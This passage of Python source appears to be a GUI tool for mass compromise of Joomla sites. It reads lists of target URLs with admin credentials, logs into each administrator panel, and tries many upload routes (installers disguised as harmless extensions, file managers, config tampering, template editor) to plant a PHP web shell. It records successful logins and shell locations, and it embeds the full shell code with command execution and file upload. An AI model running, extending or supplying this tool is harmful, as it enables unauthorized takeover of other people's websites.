            <jdoc:include type="modules" name="position-2" style="none" />
            <jdoc:include type="component" />
        </main>
        <footer>
            <jdoc:include type="modules" name="position-3" style="none" />
        </footer>
    </div>
</body>
</html>"""
                
                with open(os.path.join(template_dir, "index.php"), "w", encoding="utf-8") as f:
                    f.write(index_content)
                
                # Create shell file
                if self.use_custom_shell:
                    shell_content = self.shell_content
                else:
                    shell_content = self.get_default_shell()
                
                with open(os.path.join(template_dir, "shell.php"), "w", encoding="utf-8") as f:
                    f.write(shell_content)
                
                # Generate random PNG images
                preview_png = generate_random_png(300, 150)
                thumbnail_png = generate_random_png(150, 75)
                
                with open(os.path.join(template_dir, "template_preview.png"), "wb") as f:
                    f.write(preview_png)
                
                with open(os.path.join(template_dir, "template_thumbnail.png"), "wb") as f:
                    f.write(thumbnail_png)
                
                # Create zip file
                zip_filename = f"{name}.zip"
                with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for root, dirs, files in os.walk(template_dir):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, template_dir)
                            zipf.write(file_path, arcname)
                
                self.update_signal.emit(f"Template created: {zip_filename}", "info")
                return name
                
            finally:
                # Clean up temporary directory
                shutil.rmtree(temp_dir)
                
        except Exception as e:
            self.update_signal.emit(f"Error creating template ZIP: {str(e)}", "error")
            return None

    def read_targets(self, file_path):
        """Read targets from file with improved encoding handling"""
        targets = []
        
        try:
            # Try different encodings to handle various input files
            encodings = ['utf-8', 'latin-1', 'ascii', 'cp1252']
            
            for encoding in encodings:
                try:
                    with open(file_path, 'r', encoding=encoding) as f:
                        for line in f:
                            line = line.strip()
                            if not line or line.startswith('#'):
                                continue
                            
                            # Parse the line
                            if '#' in line:
                                parts = line.split('#', 1)
                                url = parts[0].strip()
                                
                                if '@' in parts[1]:
                                    creds = parts[1].strip().split('@', 1)
                                    username = creds[0].strip()
                                    password = creds[1].strip()
                                    
                                    # Normalize URL
                                    if not url.startswith(('http://', 'https://')):
                                        url = 'http://' + url
                                    
                                    if not url.endswith('/administrator'):
                                        if url.endswith('/'):
                                            url = url[:-1]
                                        url = url + '/administrator'
                                    
                                    base_url = url.replace('/administrator', '')
                                    
                                    targets.append({
                                        'url': url,
                                        'username': username,
                                        'password': password,
                                        'base_url': base_url
                                    })
                    break  # Successfully read the file, exit the loop
                except UnicodeDecodeError:
                    continue  # Try next encoding
            
            return targets
        except Exception as e:
            self.update_signal.emit(f"Error reading targets: {str(e)}", "error")
            return []

    def upload_via_component(self, session, base_url, headers):
        """Upload shell via component installation"""
        try:
            # Get component installation page
            install_page = session.get(
                f"{base_url}/administrator/index.php?option=com_installer",
                headers=headers,
                verify=False,
                timeout=20
            )
            
            # Find token with improved regex
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, install_page.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if token_name:
                # Upload component
                files = {
                    'install_package': (f"{self.component_name}.zip", open(f"{self.component_name}.zip", 'rb'), 'application/zip'),
                    'installtype': (None, 'upload'),
                    token_name: (None, '1'),
                    'task': (None, 'install.install')
                }
                
                upload_result = session.post(
                    f"{base_url}/administrator/index.php?option=com_installer&task=install.install",
                    headers=headers,
                    files=files,
                    verify=False,
                    timeout=30
                )
                
                shell_url = f"{base_url}/administrator/components/{self.component_name}/shell.php"
                
                if upload_result.status_code == 200 and "success" in upload_result.text.lower():
                    self.update_signal.emit(f"Shell upload successful via component: {shell_url}", "success")
                    return shell_url
                else:
                    self.update_signal.emit(f"Component upload failed", "error")
                    return None
            else:
                self.update_signal.emit(f"Failed to find token for component upload", "error")
                return None
        except Exception as e:
            self.update_signal.emit(f"Component upload error: {str(e)}", "error")
            return None

    def upload_via_template(self, session, base_url, headers, template_name):
        """Upload shell via template installation"""
        try:
            # Get template installation page
            install_page = session.get(
                f"{base_url}/administrator/index.php?option=com_installer&view=install",
                headers=headers,
                verify=False,
                timeout=20
            )
            
            # Find token with improved regex
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, install_page.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if token_name:
                # Upload template
                files = {
                    'install_package': (f"{template_name}.zip", open(f"{template_name}.zip", 'rb'), 'application/zip'),
                    'installtype': (None, 'upload'),
                    token_name: (None, '1'),
                    'task': (None, 'install.install')
                }
                
                upload_result = session.post(
                    f"{base_url}/administrator/index.php?option=com_installer&task=install.install",
                    headers=headers,
                    files=files,
                    verify=False,
                    timeout=30
                )
                
                shell_url = f"{base_url}/templates/{template_name}/shell.php"
                
                if upload_result.status_code == 200 and "success" in upload_result.text.lower():
                    self.update_signal.emit(f"Shell upload successful via template: {shell_url}", "success")
                    return shell_url
                else:
                    self.update_signal.emit(f"Template upload failed", "error")
                    return None
            else:
                self.update_signal.emit(f"Failed to find token for template upload", "error")
                return None
        except Exception as e:
            self.update_signal.emit(f"Template upload error: {str(e)}", "error")
            return None

    def upload_via_file_manager(self, session, base_url, headers):
        """Upload shell via Joomla file manager"""
        try:
            # Try to identify if certain file managers are installed
            common_file_managers = [
                # Format: [endpoint, indicator_text, upload_function]
                ["/administrator/index.php?option=com_media", "com_media", self.upload_via_joomla_media],
                ["/administrator/index.php?option=com_jce", "com_jce", self.upload_via_jce],
                ["/administrator/index.php?option=com_rokpad", "com_rokpad", self.upload_via_rokpad],
                ["/administrator/index.php?option=com_joomlaupdate", "com_joomlaupdate", self.upload_via_joomla_update],
                ["/administrator/index.php?option=com_ajax", "com_ajax", self.upload_via_ajax],
                ["/administrator/index.php?option=com_config", "com_config", self.upload_via_config],
                ["/administrator/index.php?option=com_jce&view=installer", "com_jce", self.upload_via_jce_installer],
            ]
            
            for endpoint, indicator, uploader in common_file_managers:
                try:
                    manager_check = session.get(
                        f"{base_url}{endpoint}",
                        headers=headers,
                        verify=False,
                        timeout=10
                    )
                    
                    if indicator in manager_check.text.lower() or manager_check.status_code == 200:
                        self.update_signal.emit(f"Found potential file manager at {endpoint}", "info")
                        shell_url = uploader(session, base_url, headers, endpoint)
                        if shell_url:
                            return shell_url
                except:
                    continue
            
            # If no file manager found, try direct injection via template editor
            self.update_signal.emit("Attempting upload via template editor...", "info")
            return self.upload_via_template_editor(session, base_url, headers)
            
        except Exception as e:
            self.update_signal.emit(f"File manager upload error: {str(e)}", "error")
            return None

    def upload_via_jce_installer(self, session, base_url, headers, endpoint):
        """Upload shell using JCE Installer"""
        try:
            # Get JCE Installer page
            jce_page = session.get(
                f"{base_url}{endpoint}",
                headers=headers,
                verify=False,
                timeout=10
            )
            
            # Look for token with improved regex
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, jce_page.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if not token_name:
                return None
            
            # Create a zip file with the shell content
            zip_name = f"package_{random_string(8)}.zip"
            temp_dir = tempfile.mkdtemp()
            
            try:
                # Create a manifest file to make it look like a valid extension
                manifest_content = """<?xml version="1.0" encoding="utf-8"?>
<extension type="file" version="3.0" method="upgrade">
    <name>File Manager Helper</name>
    <version>1.0.0</version>
    <description>Helper extension for file management</description>
    <files>
        <filename>helper.txt</filename>
    </files>
</extension>"""
                
                helper_filename = f"helper_{random_string(8)}.txt"
                helper_path = os.path.join(temp_dir, helper_filename)
                manifest_path = os.path.join(temp_dir, "manifest.xml")
                
                with open(helper_path, "w", encoding="utf-8") as f:
                    f.write(self.shell_content if self.use_custom_shell else self.get_default_shell())
                with open(manifest_path, "w", encoding="utf-8") as f:
                    f.write(manifest_content)
                
                # Create zip file
                with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    zipf.write(helper_path, helper_filename)
                    zipf.write(manifest_path, "manifest.xml")
                
                # Upload the zip file
                files = {
                    'install_package': (zip_name, open(zip_name, 'rb'), 'application/zip'),
                    token_name: (None, '1'),
                    'installtype': (None, 'upload'),
                    'task': (None, 'install.install')
                }
                
                upload_response = session.post(
                    f"{base_url}/administrator/index.php?option=com_jce&view=installer&task=install.install",
                    headers=headers,
                    files=files,
                    verify=False,
                    timeout=30
                )
                
                # Check if upload was successful
                if upload_response.status_code == 200 and ("success" in upload_response.text.lower() or "install" in upload_response.text.lower()):
                    shell_url = f"{base_url}/tmp/{helper_filename}"
                    self.update_signal.emit(f"Shell upload successful via JCE Installer: {shell_url}", "success")
                    return shell_url
                else:
                    self.update_signal.emit("Failed to upload via JCE Installer", "error")
                    return None
                    
            finally:
                # Clean up the zip file and temp directory
                if os.path.exists(zip_name):
                    os.remove(zip_name)
                shutil.rmtree(temp_dir)
                
        except Exception as e:
            self.update_signal.emit(f"JCE Installer upload error: {str(e)}", "error")
            return None

    def upload_via_joomla_media(self, session, base_url, headers, endpoint):
        """Upload shell using Joomla's built-in media manager"""
        try:
            # Get token first
            media_page = session.get(
                f"{base_url}{endpoint}",
                headers=headers,
                verify=False,
                timeout=10
            )
            
            # Look for token with improved regex
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, media_page.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if token_name:
                # Prepare shell content
                if self.use_custom_shell:
                    shell_content = self.shell_content
                else:
                    shell_content = self.get_default_shell()
                
                # Create temporary file with safe extension
                safe_filename = f"config_{random_string(8)}.txt"
                temp_dir = tempfile.gettempdir()
                tmp_file = os.path.join(temp_dir, safe_filename)
                
                try:
                    with open(tmp_file, "w", encoding="utf-8") as f:
                        f.write(shell_content)
                    
                    # Get correct MIME type
                    mime_type, _ = mimetypes.guess_type(tmp_file)
                    if not mime_type:
                        mime_type = 'text/plain'
                    
                    # Upload file with safe extension
                    files = {
                        'Filedata': (safe_filename, open(tmp_file, 'rb'), mime_type),
                        token_name: (None, '1'),
                        'task': (None, 'file.upload'),
                        'return': (None, ''),
                        'folder': (None, '')
                    }
                    
                    upload_response = session.post(
                        f"{base_url}/administrator/index.php?option=com_media&task=file.upload",
                        headers=headers,
                        files=files,
                        verify=False,
                        timeout=20
                    )
                    
                    try:
                        # Joomla media manager returns JSON response
                        upload_json = upload_response.json()
                        if 'success' in upload_json and upload_json['success']:
                            shell_url = f"{base_url}/images/{safe_filename}"
                            self.update_signal.emit(f"Shell upload successful via Media Manager: {shell_url}", "success")
                            return shell_url
                        elif 'message' in upload_json:
                            self.update_signal.emit(f"Media Manager error: {upload_json['message']}", "error")
                    except:
                        # If not JSON, check for success in HTML
                        if "success" in upload_response.text.lower():
                            shell_url = f"{base_url}/images/{safe_filename}"
                            self.update_signal.emit(f"Shell upload successful via Media Manager: {shell_url}", "success")
                            return shell_url
                    
                    self.update_signal.emit("Failed to upload via Media Manager", "error")
                finally:
                    # Clean up temp file
                    if os.path.exists(tmp_file):
                        os.remove(tmp_file)
            else:
                self.update_signal.emit("Failed to find token for Media Manager", "error")
            
            return None
        except Exception as e:
            self.update_signal.emit(f"Media Manager upload error: {str(e)}", "error")
            return None

    def upload_via_jce(self, session, base_url, headers, endpoint):
        """Upload shell using JCE file manager"""
        try:
            # Get token first
            jce_page = session.get(
                f"{base_url}{endpoint}",
                headers=headers,
                verify=False,
                timeout=10
            )
            
            # Look for token with improved regex
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, jce_page.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if token_name:
                # Prepare shell content
                if self.use_custom_shell:
                    shell_content = self.shell_content
                else:
                    shell_content = self.get_default_shell()
                
                # Create temporary file with safe extension
                safe_filename = f"document_{random_string(8)}.txt"
                temp_dir = tempfile.gettempdir()
                tmp_file = os.path.join(temp_dir, safe_filename)
                
                try:
                    with open(tmp_file, "w", encoding="utf-8") as f:
                        f.write(shell_content)
                    
                    # Upload file
                    files = {
                        'upload': (safe_filename, open(tmp_file, 'rb'), 'text/plain'),
                        token_name: (None, '1'),
                        'task': (None, 'upload'),
                        'dir': (None, '')
                    }
                    
                    upload_response = session.post(
                        f"{base_url}/administrator/index.php?option=com_jce&task=plugin&plugin=filemanager&file=filemanager&method=upload",
                        headers=headers,
                        files=files,
                        verify=False,
                        timeout=20
                    )
                    
                    try:
                        upload_json = upload_response.json()
                        if 'result' in upload_json and upload_json['result'] == 'success':
                            shell_url = f"{base_url}/images/{safe_filename}"
                            self.update_signal.emit(f"Shell upload successful via JCE: {shell_url}", "success")
                            return shell_url
                    except:
                        pass
                    
                    self.update_signal.emit("Failed to upload via JCE", "error")
                finally:
                    # Clean up temp file
                    if os.path.exists(tmp_file):
                        os.remove(tmp_file)
            else:
                self.update_signal.emit("Failed to find token for JCE", "error")
            
            return None
        except Exception as e:
            self.update_signal.emit(f"JCE upload error: {str(e)}", "error")
            return None

    def upload_via_rokpad(self, session, base_url, headers, endpoint):
        """Upload shell using RokPad file editor"""
        try:
            # Get token first
            rokpad_page = session.get(
                f"{base_url}{endpoint}",
                headers=headers,
                verify=False,
                timeout=10
            )
            
            # Look for token with improved regex
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, rokpad_page.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if token_name:
                # Prepare shell content
                if self.use_custom_shell:
                    shell_content = self.shell_content
                else:
                    shell_content = self.get_default_shell()
                
                # Create new file via RokPad
                safe_filename = f"config_{random_string(8)}.txt"
                
                # Prepare data for new file creation
                edit_data = {
                    token_name: '1',
                    'task': 'file.save',
                    'file': safe_filename,
                    'content': shell_content
                }
                
                edit_response = session.post(
                    f"{base_url}/administrator/index.php?option=com_rokpad&task=file.save",
                    headers=headers,
                    data=edit_data,
                    verify=False,
                    timeout=20
                )
                
                try:
                    edit_json = edit_response.json()
                    if 'success' in edit_json and edit_json['success']:
                        shell_url = f"{base_url}/templates/{safe_filename}"
                        self.update_signal.emit(f"Shell upload successful via RokPad: {shell_url}", "success")
                        return shell_url
                except:
                    pass
                
                self.update_signal.emit("Failed to create file via RokPad", "error")
            else:
                self.update_signal.emit("Failed to find token for RokPad", "error")
            
            return None
        except Exception as e:
            self.update_signal.emit(f"RokPad upload error: {str(e)}", "error")
            return None

    def upload_via_joomla_update(self, session, base_url, headers, endpoint):
        """Upload shell using Joomla update component"""
        try:
            # Get update page
            update_page = session.get(
                f"{base_url}{endpoint}",
                headers=headers,
                verify=False,
                timeout=10
            )
            
            # Look for token with improved regex
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, update_page.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if token_name:
                # Prepare shell content
                if self.use_custom_shell:
                    shell_content = self.shell_content
                else:
                    shell_content = self.get_default_shell()
                
                # Create temporary file with safe extension
                safe_filename = f"update_{random_string(8)}.txt"
                temp_dir = tempfile.gettempdir()
                tmp_file = os.path.join(temp_dir, safe_filename)
                
                try:
                    with open(tmp_file, "w", encoding="utf-8") as f:
                        f.write(shell_content)
                    
                    # Try to upload via update method
                    files = {
                        'install_package': (safe_filename, open(tmp_file, 'rb'), 'text/plain'),
                        token_name: (None, '1'),
                        'task': (None, 'update.install')
                    }
                    
                    upload_response = session.post(
                        f"{base_url}/administrator/index.php?option=com_joomlaupdate&task=update.install",
                        headers=headers,
                        files=files,
                        verify=False,
                        timeout=20
                    )
                    
                    if "success" in upload_response.text.lower():
                        shell_url = f"{base_url}/images/{safe_filename}"
                        self.update_signal.emit(f"Shell upload successful via Joomla Update: {shell_url}", "success")
                        return shell_url
                    else:
                        self.update_signal.emit("Failed to upload via Joomla Update", "error")
                finally:
                    # Clean up temp file
                    if os.path.exists(tmp_file):
                        os.remove(tmp_file)
            else:
                self.update_signal.emit("Failed to find token for Joomla Update", "error")
            
            return None
        except Exception as e:
            self.update_signal.emit(f"Joomla Update upload error: {str(e)}", "error")
            return None

    def upload_via_ajax(self, session, base_url, headers, endpoint):
        """Upload shell using Joomla AJAX component"""
        try:
            # Prepare shell content
            if self.use_custom_shell:
                shell_content = self.shell_content
                shell_content_b64 = base64.b64encode(shell_content.encode()).decode()
            else:
                shell_content = self.get_default_shell()
                shell_content_b64 = base64.b64encode(shell_content.encode()).decode()
            
            # Try to create file via AJAX
            safe_filename = f"ajax_{random_string(8)}.txt"
            shell_url = f"{base_url}/images/{safe_filename}"
            
            # Try to write file directly if permissions allow
            data = {
                'option': 'com_ajax',
                'group': 'system',
                'plugin': 'webinstaller',
                'format': 'raw',
                'method': 'download',
                'url': f'data:text/plain;base64,{shell_content_b64}',
                'file': safe_filename
            }
            
            ajax_response = session.post(
                f"{base_url}/administrator/index.php",
                headers=headers,
                data=data,
                verify=False,
                timeout=20
            )
            
            if ajax_response.status_code == 200:
                # Verify the file was created
                verify_response = session.get(shell_url, headers=headers, verify=False, timeout=10)
                if verify_response.status_code == 200:
                    self.update_signal.emit(f"Shell upload successful via AJAX: {shell_url}", "success")
                    return shell_url
            
            self.update_signal.emit("Failed to upload via AJAX", "error")
            return None
        except Exception as e:
            self.update_signal.emit(f"AJAX upload error: {str(e)}", "error")
            return None

    def upload_via_config(self, session, base_url, headers, endpoint):
        """Upload shell using Joomla configuration component"""
        try:
            # Get config page
            config_page = session.get(
                f"{base_url}{endpoint}",
                headers=headers,
                verify=False,
                timeout=10
            )
            
            # Look for token with improved regex
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, config_page.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if token_name:
                # Prepare shell content
                if self.use_custom_shell:
                    shell_content = self.shell_content
                else:
                    shell_content = self.get_default_shell()
                
                # Try to modify configuration to include our shell
                config_data = {
                    token_name: '1',
                    'task': 'config.apply',
                    'ftp_enable': '0',
                    'root_user': 'admin',
                    'root_password': 'password',
                    'root_shell': shell_content
                }
                
                config_response = session.post(
                    f"{base_url}/administrator/index.php?option=com_config&task=config.apply",
                    headers=headers,
                    data=config_data,
                    verify=False,
                    timeout=20
                )
                
                if config_response.status_code == 200:
                    # Try to access the shell
                    shell_url = f"{base_url}/configuration.php"
                    verify_response = session.get(shell_url, headers=headers, verify=False, timeout=10)
                    if verify_response.status_code == 200:
                        self.update_signal.emit(f"Shell upload successful via Config: {shell_url}", "success")
                        return shell_url
                
                self.update_signal.emit("Failed to upload via Config", "error")
            else:
                self.update_signal.emit("Failed to find token for Config", "error")
            
            return None
        except Exception as e:
            self.update_signal.emit(f"Config upload error: {str(e)}", "error")
            return None

    def upload_via_template_editor(self, session, base_url, headers):
        """Upload shell using Joomla template editor"""
        try:
            # Get template editor page to find available templates
            editor_page = session.get(
                f"{base_url}/administrator/index.php?option=com_templates&view=template&id=0",
                headers=headers,
                verify=False,
                timeout=20
            )
            
            # Find token with improved regex
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, editor_page.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if not token_name:
                self.update_signal.emit("Could not find template editor token", "error")
                return None
            
            # Prepare shell content
            if self.use_custom_shell:
                shell_content = self.shell_content
            else:
                shell_content = self.get_default_shell()
            
            # Create new file in the template
            safe_filename = f"template_{random_string(8)}.txt"
            
            # Prepare data for new file creation
            edit_data = {
                token_name: '1',
                'task': 'template.save',
                'file': safe_filename,
                'content': shell_content
            }
            
            edit_response = session.post(
                f"{base_url}/administrator/index.php?option=com_templates&task=template.save",
                headers=headers,
                data=edit_data,
                verify=False,
                timeout=20
            )
            
            if "successfully saved" in edit_response.text.lower():
                shell_url = f"{base_url}/templates/{safe_filename}"
                self.update_signal.emit(f"Shell upload successful via template editor: {shell_url}", "success")
                return shell_url
            else:
                self.update_signal.emit("Failed to create file via template editor", "error")
                return None
            
        except Exception as e:
            self.update_signal.emit(f"Template editor upload error: {str(e)}", "error")
            return None

    def process_target(self, target, index, total):
        """Process a single Joomla target"""
        if not self.is_running:
            return
            
        url = target['url']
        username = target['username']
        password = target['password']
        base_url = target['base_url']
        
        headers = {'User-Agent': random.choice(self.user_agents)}
        session = requests.Session()
        
        self.update_signal.emit(f"\nProcessing {index+1}/{total}: {base_url}", "target")
        self.update_signal.emit(f"User: {username}", "info")
        
        try:
            # Get login page to find token
            login_page = session.get(
                url,
                headers=headers,
                verify=False,
                timeout=20
            )
            
            # Find token with improved regex
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, login_page.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if not token_name:
                self.update_signal.emit(f"Could not find login token", "error")
                write_to_file(FAIL_LOG, f"{base_url}|{username}|{password}|No login token found\n")
                return
            
            # Login attempt
            login_data = {
                'username': username,
                'passwd': password,
                'option': 'com_login',
                'task': 'login',
                'return': 'aW5kZXgucGhw',
                token_name: '1'
            }
            
            r = session.post(
                url,
                headers=headers,
                data=login_data,
                verify=False,
                timeout=20,
                allow_redirects=True
            )
            
            # Check login success
            if 'task=logout' in r.text and 'com_cpanel' in r.text:
                self.update_signal.emit(f"Login successful: {base_url}", "success")
                write_to_file(LOGIN_SUCCESS, f"{base_url}|{username}|{password}\n")
                
                # Detect Joomla version
                version = self.detect_joomla_version(session, base_url, headers)
                self.update_signal.emit(f"Joomla version detected: {version}", "info")
                
                # Get appropriate exploit methods for this version
                exploit_methods = self.get_exploit_methods_for_version(version)
                self.update_signal.emit(f"Available exploit methods: {', '.join(exploit_methods)}", "info")
                
                # Try to upload shell based on selected method
                shell_url = None
                
                if self.upload_method == "Component":
                    shell_url = self.upload_via_component(session, base_url, headers)
                elif self.upload_method == "Template":
                    template_name = self.create_template_zip()
                    if template_name:
                        shell_url = self.upload_via_template(session, base_url, headers, template_name)
                        # Clean up template zip
                        if os.path.exists(f"{template_name}.zip"):
                            os.remove(f"{template_name}.zip")
                elif self.upload_method == "FileManager":
                    shell_url = self.upload_via_file_manager(session, base_url, headers)
                elif self.upload_method == "Auto Upload":
                    # Try all available methods automatically
                    auto_plugin = AutoUploadPlugin()
                    auto_plugin.update_signal = self.update_signal
                    shell_url = auto_plugin.execute(session, base_url, headers, self.shell_content if self.use_custom_shell else self.get_default_shell())
                elif self.upload_method in ["Media Manager", "JCE", "RokPad", "Joomla Update", "AJAX", "Config", "JCE Installer", "ARI Image Slider", "Simple File Upload"]:
                    # Use plugin system for other methods
                    for plugin in self.plugins:
                        if plugin.name == self.upload_method:
                            shell_url = plugin.execute(session, base_url, headers, self.shell_content if self.use_custom_shell else self.get_default_shell())
                            break
                
                if shell_url:
                    write_to_file(UPLOAD_SUCCESS, f"{shell_url}|{username}|{password}\n")
                    
                    # Try to verify shell is working
                    try:
                        verify = session.get(shell_url, headers=headers, verify=False, timeout=10)
                        if verify.status_code == 200:
                            self.update_signal.emit(f"Shell verified working", "success")
                        else:
                            self.update_signal.emit(f"Shell uploaded but may not be working properly", "info")
                    except:
                        self.update_signal.emit(f"Could not verify shell", "info")
                else:
                    self.update_signal.emit(f"All shell upload methods failed", "error")
                    write_to_file(FAIL_LOG, f"{base_url}|{username}|{password}|Login Success but Upload Failed\n")
            else:
                self.update_signal.emit(f"Login failed: {base_url}", "error")
                write_to_file(FAIL_LOG, f"{base_url}|{username}|{password}|Login Failed\n")
        except Exception as e:
            self.update_signal.emit(f"Connection error: {str(e)}", "error")
            write_to_file(FAIL_LOG, f"{base_url}|{username}|{password}|Connection Error: {str(e)}\n")
        
        # Update progress
        self.progress_signal.emit(index + 1, total)
    
    def get_default_shell(self):
        """Get default shell content without problematic characters"""
        return """<?php
defined('_JEXEC') or die('Restricted access');
error_reporting(0);
@ini_set('display_errors', 0);
echo '<!DOCTYPE html><html><head><title>Web Shell</title>';
echo '<style>body{background:#0a0a12;color:#00ffea;font-family:Consolas,monospace;padding:20px;}';
echo 'pre{background:#1a1a2a;padding:10px;border-radius:5px;}';
echo 'input,textarea,select{background:#1a1a2a;color:#00ffea;border:1px solid #00ffea;padding:5px;margin:5px;}';
echo 'button{background:#ff00ff;color:#0a0a12;border:none;padding:8px 15px;cursor:pointer;font-weight:bold;}';
echo '.success{color:#00ff00;}.error{color:#ff0066;}.warning{color:#ffcc00;}';
echo '</style></head><body>';

echo '<h1>Web Shell</h1>';
echo '<div style="background:#1a1a2a;padding:15px;border-radius:5px;margin-bottom:20px;">';
echo '<pre>'.php_uname().'</pre>';
echo '<p>'.getcwd().'</p>';
echo '<p>PHP '.phpversion().'</p>';
echo '</div>';

// Command execution
echo '<div style="margin-bottom:20px;">';
echo '<h2>Command Execution</h2>';
echo '<form method="post">';
echo '<input type="text" name="cmd" style="width:70%" placeholder="Enter command">';
echo '<button type="submit">Execute</button>';
echo '</form>';

if(isset($_POST['cmd'])){
    echo '<div style="background:#1a1a2a;padding:10px;border-radius:5px;margin-top:10px;">';
    echo '<pre>'.shell_exec($_POST['cmd']).'</pre>';
    echo '</div>';
}
echo '</div>';

// File upload
echo '<div style="margin-bottom:20px;">';
echo '<h2>File Upload</h2>';
echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="f">';
echo '<button type="submit">Upload</button>';
echo '</form>';

if(isset($_FILES['f']) && $_FILES['f']['name']){
    $target = basename($_FILES['f']['name']);
    if(move_uploaded_file($_FILES['f']['tmp_name'], $target)){
        echo '<p class="success">Upload successful: <a href="'.$target.'" style="color:#00ffea;">'.$target.'</a></p>';
    }else{
        echo '<p class="error">Upload failed</p>';
    }
}
echo '</div>';

// File manager
echo '<div style="margin-bottom:20px;">';
echo '<h2>File Manager</h2>';
echo '<div style="background:#1a1a2a;padding:10px;border-radius:5px;max-height:300px;overflow:auto;">';
$files = scandir('.');
foreach($files as $file){
    if($file == '.' || $file == '..') continue;
    $color = is_dir($file) ? "#ff00ff" : "#00ffea";
    $size = is_dir($file) ? "DIR" : filesize($file)." bytes";
    echo '<div style="padding:3px;"><span style="color:'.$color.';">'.$file.'</span> - '.$size.'</div>';
}
echo '</div>';
echo '</div>';

// PHP info
echo '<div>';
echo '<h2>PHP Information</h2>';
echo '<form method="post">';
echo '<button type="submit" name="phpinfo">Show PHP Info</button>';
echo '</form>';

if(isset($_POST['phpinfo'])){
    ob_start();
    phpinfo();
    $phpinfo = ob_get_contents();
    ob_end_clean();
    echo '<div style="background:#1a1a2a;padding:10px;border-radius:5px;margin-top:10px;overflow:auto;max-height:400px;">';
    echo $phpinfo;
    echo '</div>';
}
echo '</div>';

echo '</body></html>';}
?>"""

class CyberpunkStyle:
    """Cyberpunk style configuration"""
    @staticmethod
    def apply_style(app):
        # Set cyberpunk color palette
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(0, 0, 0))  # Black background
        palette.setColor(QPalette.WindowText, QColor(0, 255, 255))  # Cyan text
        palette.setColor(QPalette.Base, QColor(20, 20, 40))  # Dark blue base
        palette.setColor(QPalette.AlternateBase, QColor(40, 40, 80))
        palette.setColor(QPalette.ToolTipBase, QColor(0, 255, 255))
        palette.setColor(QPalette.ToolTipText, QColor(0, 0, 0))
        palette.setColor(QPalette.Text, QColor(0, 255, 255))  # Cyan text
        palette.setColor(QPalette.Button, QColor(0, 0, 0))  # Black buttons
        palette.setColor(QPalette.ButtonText, QColor(0, 255, 255))  # Cyan button text
        palette.setColor(QPalette.BrightText, QColor(255, 0, 255))  # Magenta bright text
        palette.setColor(QPalette.Highlight, QColor(255, 0, 255))  # Magenta highlight
        palette.setColor(QPalette.HighlightedText, QColor(0, 0, 0))
        
        app.setPalette(palette)
        
        # Set cyberpunk style sheet
        style = """
        QMainWindow, QDialog, QWidget {
            background-color: #000000;
            color: #00ffff;
            border: 1px solid #00ffff;
        }
        
        QGroupBox {
            font-weight: bold;
            border: 2px solid #ff00ff;
            border-radius: 5px;
            margin-top: 1ex;
            padding-top: 10px;
        }
        
        QGroupBox::title {
            subcontrol-origin: margin;
            subcontrol-position: top center;
            padding: 0 5px;
            color: #ff00ff;
        }
        
        QPushButton {
            background-color: #000000;
            color: #00ffff;
            border: 2px solid #00ffff;
            border-radius: 5px;
            padding: 5px;
            font-weight: bold;
        }
        
        QPushButton:hover {
            background-color: #003333;
            border: 2px solid #ff00ff;
            color: #ff00ff;
        }
        
        QPushButton:pressed {
            background-color: #ff00ff;
            color: #000000;
        }
        
        QPushButton:disabled {
            background-color: #333333;
            color: #555555;
            border: 2px solid #555555;
        }
        
        QLineEdit, QTextEdit, QPlainTextEdit {
            background-color: #101020;
            color: #00ffff;
            border: 1px solid #00ffff;
            border-radius: 3px;
            padding: 3px;
